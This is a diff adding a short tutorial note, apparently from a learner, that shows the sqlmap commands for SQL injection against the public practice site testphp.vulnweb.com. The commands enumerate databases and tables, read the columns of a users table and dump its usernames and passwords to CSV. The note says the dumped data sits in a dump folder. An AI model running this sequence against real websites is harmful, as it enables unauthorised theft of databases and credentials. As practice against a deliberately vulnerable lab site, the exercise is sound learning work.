@@ -1,0 +1,29 @@
+the following querry is to find either the given URL (The website) is vulnerable or not.
+
+--> $ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2 " --dbs
+
+Once the above querry runs prefectly and tells what vulnerability that website has  and you get the names of the Databases that Website contains.
+In my case the Vulnerability is GET method
+
+the following querry is to find the tables name of a specific Database
+
+--> $ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2 " -D {database name} --tables  
+
+ above query will give the names of the tables in the provided  {Database name}
+
+Once we get the names of table we can easily access to the columns and its data
+
+Following query will demonstrate it for example in my case i have got tables names and demonstrated on (users table) and tried to access the UNAME & PASS
+
+--> $ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2 " -D {database name} -T users --columns
+
+
+following command is used to dump the data of DATABASE (save table of database into .csv file extention)
+
+--> $ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2 " -D {database name} --dump -T users 
+
+
+THE DATA WHICH I HAVE DUMPED USING SQL INJECTION IS IN DUMP FOLDER
+
+
+
